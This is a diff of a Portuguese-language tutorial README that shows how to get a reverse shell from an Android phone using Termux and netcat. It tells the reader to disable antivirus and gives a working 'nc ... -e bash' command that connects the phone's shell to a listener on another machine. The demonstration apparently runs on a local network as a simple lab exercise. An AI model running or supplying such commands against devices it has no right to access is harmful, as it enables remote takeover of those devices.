@@ -1,20 +1,34 @@
-## Tutorial Reverse Shell Termux 2025
+=========================================
+📱🔒 Tutorial Reverse Shell Termux 2025 🔑
+=========================================
 
-- Passos a seguir:
-1° Turn of Antivirus ( PC , cell )
-2° Install Pkg's in Termux ( nano , which , nc etc...)
-3° Install NC on PC 
+### ⚙️ Passos a seguir:
 
-Dowloading nc in windons ( link: https://github.com/diegocr/netcat/blob/master/nc.exe )
-<img width="981" height="519" alt="image" src="https://github.com/user-attachments/assets/0e478801-485a-4bef-80fe-c063411f6493" />
-(IMAGEM DO PC)
+1️⃣ **Desative o antivírus** (no PC e no celular)  
+2️⃣ **Instale os pacotes no Termux:** `nano`, `which`, `nc`, etc.  
+3️⃣ **Instale o Netcat (NC) no PC**  
 
-<img width="296" height="152" alt="image" src="https://github.com/user-attachments/assets/594827ce-91ca-4867-9c88-a112ea16dfa6" />
-( Imagem do celular )
+🔽 **Baixar o Netcat para Windows:**  
+🔗 https://github.com/diegocr/netcat/blob/master/nc.exe
 
-Comando usado ( nc 192.168.100.168 4444 -e 'caminho da bash do termux')
+🖥️ **Imagem do PC:**  
+![Imagem do PC](https://github.com/user-attachments/assets/0e478801-485a-4bef-80fe-c063411f6493)
 
-# isto é apenas a forma mais simples de mostrar um shell reverse num telefone 
+📱 **Imagem do celular:**  
+![Imagem do celular](https://github.com/user-attachments/assets/594827ce-91ca-4867-9c88-a112ea16dfa6)
 
-shell reversa obtida
-<img width="608" height="284" alt="image" src="https://github.com/user-attachments/assets/fc387a56-0d8c-4b98-9e4d-c87622d45b73" />
+### 💻 Comando usado no Termux:
+
+```bash
+nc 192.168.100.168 4444 -e /data/data/com.termux/files/usr/bin/bash
+```
+
+📝 *Substitua o caminho acima pelo caminho da bash no seu Termux se for diferente.*
+
+---
+
+### 🧠 Observação:
+> Essa é a forma **mais simples** de obter uma shell reversa em um telefone Android via Termux.
+
+🔁 **Shell reversa obtida:**  
+![Shell reversa](https://github.com/user-attachments/assets/fc387a56-0d8c-4b98-9e4d-c87622d45b73)
